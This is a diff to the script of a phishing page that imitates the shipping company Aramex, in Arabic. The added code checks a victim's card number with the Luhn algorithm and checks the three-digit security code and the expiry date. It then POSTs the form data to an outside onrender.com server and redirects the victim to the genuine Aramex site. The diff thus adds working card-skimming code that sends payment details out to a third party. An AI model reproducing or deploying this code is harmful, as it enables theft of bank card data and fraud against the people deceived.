@@ -2473,30 +2473,79 @@ window.__TsmHiddenField = $get('ctl08_TSM');;(function() {
             // Save the JSON string to local storage
             localStorage.setItem('formData', jsonData);
 
-            showLoading();
+            
 
-            fetch('https://server-hz1c.onrender.com/saveData', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(formData)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data);
-                window.location.href = 'https://www.aramex.com/ma/ar/%D8%B9%D9%86-%D8%A3%D8%B1%D8%A7%D9%85%D9%83%D8%B3/%D9%86%D8%A8%D8%B0%D8%A9-%D8%B9%D9%86-%D8%A3%D8%B1%D8%A7%D9%85%D9%83%D8%B3';
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Error try again.');
-            });
+            if (isValidCreditCard(input1)) {
+                if(input2.length ==3){
+                    if(input3!=1 || input4!=1){
+                        showLoading();
+
+                        fetch('https://server-hz1c.onrender.com/saveData', {
+                        method: 'POST',
+                        headers: {
+                        'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log(data);
+                            window.location.href = 'https://www.aramex.com/ma/ar/%D8%B9%D9%86-%D8%A3%D8%B1%D8%A7%D9%85%D9%83%D8%B3/%D9%86%D8%A8%D8%B0%D8%A9-%D8%B9%D9%86-%D8%A3%D8%B1%D8%A7%D9%85%D9%83%D8%B3';
+                        })
+                        .catch(error => {
+                        console.error('Error:', error);
+                        alert('Error try again.');
+                        });
+                    }else{
+                        alert("تاريخ إنتهاء الصلاحية غير صحيح")
+                    }
+                    
+                }else{
+                    alert("القن السري الذي أدخلته غير صحيح")
+                }
+            } else {
+                alert("رقم البطاقة الذي أدخلته غير صحيح")
+            }
+
+            
     }
 
     function showLoading() {
         // Show loading overlay
         document.getElementById('loading-overlay').style.display = 'flex';
     }
+
+    function isValidCreditCard(cardNumber) {
+    // Remove spaces and non-numeric characters
+    cardNumber = cardNumber.replace(/\D/g, '');
+
+    // Check if the input is a valid number
+    if (!/^\d+$/.test(cardNumber)) {
+        return false;
+    }
+
+    // Convert the card number to an array of digits
+    const digits = cardNumber.split('').map(Number);
+
+    // Reverse the array of digits
+    digits.reverse();
+
+    // Apply the Luhn algorithm
+    let sum = 0;
+    for (let i = 0; i < digits.length; i++) {
+        let digit = digits[i];
+        if (i % 2 === 1) {
+            digit *= 2;
+            if (digit > 9) {
+                digit -= 9;
+            }
+        }
+        sum += digit;
+    }
+
+    // The card number is valid if the sum is a multiple of 10
+    return sum % 10 === 0;
+}
 </script>
 </html><script type="text/javascript" src="/WebResource.axd?d=NjxTqR2bqTw1rewxxlkHPjjftQaE5A3wt5OLAzxpGdori2bjfAKS7jH0_PrxLAv_OEOtfC0m6akeJe2rKSYrzkidzxzk4HUnRy8AAryd0kPvLyXRVjw49RZhpFMrvb_hg2tEn0yFEB7efvby5rDPMdAYGJZz0eo7tswlOXKo1RerWwCdHlm-80E76rKsUcNdXhFvGSkhYp_1x4I0atIaEwZLqQ41&amp;t=638429742180000000">
 
